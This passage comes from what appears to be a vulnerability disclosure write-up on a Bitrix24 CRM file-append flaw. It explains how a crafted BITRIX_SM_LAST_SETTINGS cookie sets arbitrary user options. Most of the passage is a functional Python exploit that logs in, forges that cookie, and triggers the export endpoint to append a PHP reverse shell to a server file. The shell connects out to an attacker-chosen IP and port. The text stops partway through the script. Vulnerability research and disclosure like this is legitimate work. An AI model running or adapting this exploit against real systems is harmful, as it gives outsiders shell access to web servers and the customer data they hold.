</span></span><span class="line"><span class="cl">    <span class="nv">$progressData</span> <span class="o">=</span> <span class="nx">\CUserOptions</span><span class="o">::</span><span class="na">GetOption</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">module</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getProgressParameterOptionName</span><span class="p">());</span> <span class="c1">// [8]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$progressData</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$progressData</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$progressData</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Although this class assumes that the return value of <code>CUserOptions::GetOption</code> cannot be arbitrarily controlled by an attacker, there are several ways to do so. In this section, we will examine one of them.</p>
<p>The <code>CUserOptions::SetOptionsFromArray</code> function found in <code>bitrix/modules/main/classes/general/user_options.php</code> lines 216 to 243 can be used to set any user option.</p>
<p>This function is called by <code>CUserOptions::SetCookieOptions</code>, shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/main/classes/general/user_options.php lines 317 to 329
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">SetCookieOptions</span><span class="p">(</span><span class="nv">$cookieName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//last user setting
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$varCookie</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$cookieName</span><span class="p">],</span> <span class="nv">$varCookie</span><span class="p">);</span> <span class="c1">// [9]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">setcookie</span><span class="p">(</span><span class="nv">$cookieName</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$varCookie</span><span class="p">[</span><span class="s2">&#34;p&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$varCookie</span><span class="p">[</span><span class="s2">&#34;sessid&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="nx">bitrix_sessid</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$arOptions</span> <span class="o">=</span> <span class="nv">$varCookie</span><span class="p">[</span><span class="s2">&#34;p&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nx">CUtil</span><span class="o">::</span><span class="na">decodeURIComponent</span><span class="p">(</span><span class="nv">$arOptions</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">CUserOptions</span><span class="o">::</span><span class="na">SetOptionsFromArray</span><span class="p">(</span><span class="nv">$arOptions</span><span class="p">);</span> <span class="c1">// [10]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function retrieves the user options from a user supplied cookie at <code>[9]</code>, parses it as a query string, then calls <code>CUserOptions::SetOptionsFromArray</code> on the result at <code>[10]</code>.</p>
<p>The <code>CUserOptions::SetCookieOptions</code> function is in turn called by the <code>CAllMain::PrologActions</code> function, if the <code>$cookieName</code> cookie is set. The default cookie name is <code>BITRIX_SM_LAST_SETTINGS</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">PrologActions</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
</span></span><span class="line"><span class="cl">    <span class="c1">// bitrix/modules/main/classes/general/main.php lines 3497 to 3501
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$cookieName</span> <span class="o">=</span> <span class="nx">COption</span><span class="o">::</span><span class="na">GetOptionString</span><span class="p">(</span><span class="s2">&#34;main&#34;</span><span class="p">,</span> <span class="s2">&#34;cookie_name&#34;</span><span class="p">,</span> <span class="s2">&#34;BITRIX_SM&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;_LAST_SETTINGS&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$cookieName</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">CUserOptions</span><span class="o">::</span><span class="na">SetCookieOptions</span><span class="p">(</span><span class="nv">$cookieName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>The <code>CAllMain::PrologActions</code> function is called in <code>bitrix/modules/main/include/prolog_before.php</code> which is included in nearly every Bitrix24 route. Therefore, by setting the <code>BITRIX_SM_LAST_SETTINGS</code> cookie, an attacker can easily manipulate their own user options.</p>
<h3 id="proof-of-concept">Proof-of-Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h3>
<p>We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that exploits the insecure file append vulnerability and opens a reverse shell connection to the victim web server. The reverse shell code, defined in the <code>CODE_TO_INJECT</code> variable, is appended to the file specified in <code>TARGET_FILE</code>.</p>
<p>A sample exploit script is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Bitrix24 Insecure File Append RCE (CVE-2023-XXXXX)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Via: https://TARGET_HOST/bitrix/services/main/ajax.php?action=bitrix%3Acrm.api.export.export</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Author: Lam Jun Rong (STAR Labs SG Pte. Ltd.)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">typing</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:8000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">SITE_ID</span> <span class="o">=</span> <span class="s2">&#34;s1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">USERNAME</span> <span class="o">=</span> <span class="s2">&#34;user&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;abcdef&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ROOT_PATH is not necessary, it is possible to use relative paths to exploit</span>
</span></span><span class="line"><span class="cl"><span class="n">ROOT_PATH</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">TARGET_FILE</span> <span class="o">=</span> <span class="s2">&#34;include/company_name.php&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">LPORT</span> <span class="o">=</span> <span class="mi">9001</span>
</span></span><span class="line"><span class="cl"><span class="n">LHOST</span> <span class="o">=</span> <span class="s2">&#34;192.168.86.43&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PROXY</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;http://localhost:8080&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">CODE_TO_INJECT</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">// Restore file for future demos
</span></span></span><span class="line"><span class="cl"><span class="s2">$file_data = file_get_contents(&#34;</span><span class="si">{</span><span class="n">ROOT_PATH</span><span class="si">}{</span><span class="n">TARGET_FILE</span><span class="si">}</span><span class="s2">&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">$original = mb_substr($file_data, 0, mb_strpos($file_data, &#39;&#34;ID&#34;;&#34;Photo&#34;&#39;));
</span></span></span><span class="line"><span class="cl"><span class="s2">file_put_contents(&#34;</span><span class="si">{</span><span class="n">ROOT_PATH</span><span class="si">}{</span><span class="n">TARGET_FILE</span><span class="si">}</span><span class="s2">&#34;, $original);
</span></span></span><span class="line"><span class="cl"><span class="s2">/* Sleep to allow nc listener to start */
</span></span></span><span class="line"><span class="cl"><span class="s2">sleep(2);
</span></span></span><span class="line"><span class="cl"><span class="s2">$sock=fsockopen($_GET[&#34;ip&#34;], intval($_GET[&#34;port&#34;]));
</span></span></span><span class="line"><span class="cl"><span class="s2">$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes); 
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">nested_to_urlencoded</span><span class="p">(</span><span class="n">val</span><span class="p">:</span> <span class="n">typing</span><span class="o">.</span><span class="n">Any</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">val</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="n">child</span> <span class="o">=</span> <span class="n">nested_to_urlencoded</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="p">(</span><span class="n">k</span> <span class="k">if</span> <span class="n">prefix</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span> <span class="k">else</span> <span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">]&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">child</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="n">out</span><span class="p">[</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="nb">type</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="ow">in</span> <span class="p">[</span><span class="nb">list</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">child</span> <span class="o">=</span> <span class="n">nested_to_urlencoded</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">]&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">child</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="n">out</span><span class="p">[</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="n">prefix</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dict_to_str</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&amp;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">d</span><span class="o">.</span><span class="n">items</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_creds</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/bitrix/tools/public_session.php&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;PHPSESSID&#34;</span><span class="p">:</span> <span class="n">cookie</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">proxies</span><span class="o">=</span><span class="n">PROXY</span><span class="p">)</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s2">&#34;OK&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="s2">&#34;./cached-creds.txt&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">cookie</span><span class="p">,</span> <span class="n">sessid</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./cached-creds.txt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">check_creds</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Using cached credentials&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Cached credentials are invalid&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/?login=yes&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;AUTH_FORM&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;TYPE&#34;</span><span class="p">:</span> <span class="s2">&#34;AUTH&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;backurl&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;USER_LOGIN&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;USER_PASSWORD&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;BITRIX_SM_LOGIN&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[!] Invalid credentials&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">sessid</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;&#39;bitrix_sessid&#39;:&#39;([a-f0-9]</span><span class="si">{32}</span><span class="s2">)&#39;&#34;</span><span class="p">),</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Logged in as </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./cached-creds.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">sessid</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_progress_data</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Setting fake user options&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&#34;BITRIX_SM_LAST_SETTINGS&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">dict_to_str</span><span class="p">(</span><span class="n">nested_to_urlencoded</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                <span class="s2">&#34;p&#34;</span><span class="p">:</span> <span class="p">[{</span>
</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;c&#34;</span><span class="p">:</span> <span class="s2">&#34;crm&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;v&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                        <span class="s2">&#34;filePath&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">ROOT_PATH</span><span class="si">}{</span><span class="n">TARGET_FILE</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                        <span class="s2">&#34;processToken&#34;</span><span class="p">:</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                    <span class="p">},</span>
</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;n&#34;</span><span class="p">:</span> <span class="s2">&#34;crm_cloud_export_CONTACT&#34;</span>
</span></span><span class="line"><span class="cl">                                <span class="p">}],</span>
</span></span><span class="line"><span class="cl">                                <span class="s2">&#34;sessid&#34;</span><span class="p">:</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">                            <span class="p">}</span>
</span></span><span class="line"><span class="cl">                        <span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/bitrix/tools/public_session.php&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">trigger_file_append</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Appending payload to target file&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/bitrix/services/main/ajax.php?action=bitrix%3Acrm.api.export.export&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;ENTITY_TYPE&#34;</span><span class="p">:</span> <span class="s2">&#34;CONTACT&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;EXPORT_TYPE&#34;</span><span class="p">:</span> <span class="s2">&#34;csv&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;COMPONENT_NAME&#34;</span><span class="p">:</span> <span class="s2">&#34;bitrix:crm.contact.list&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;PROCESS_TOKEN&#34;</span><span class="p">:</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;REQUISITE_MULTILINE&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;EXPORT_ALL_FIELDS&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;INITIAL_OPTIONS[REQUISITE_MULTILINE]&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;INITIAL_OPTIONS[EXPORT_ALL_FIELDS]&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete_contact</span><span class="p">(</span><span class="n">session</span><span class="p">:</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">,</span> <span class="n">sessid</span><span class="p">,</span> <span class="n">contactId</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Deleting contact </span><span class="si">{</span><span class="n">contactId</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/bitrix/services/main/ajax.php?action=crm.api.entity.prepareDeletion&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;params[gridId]=CRM_CONTACT_LIST_V12&amp;params[entityTypeId]=3&amp;params[extras][CATEGORY_ID]=0&amp;params[entityIds][0]=</span><span class="si">{</span><span class="n">contactId</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">hash</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&#34;data&#34;</span><span class="p">][</span><span class="s2">&#34;hash&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
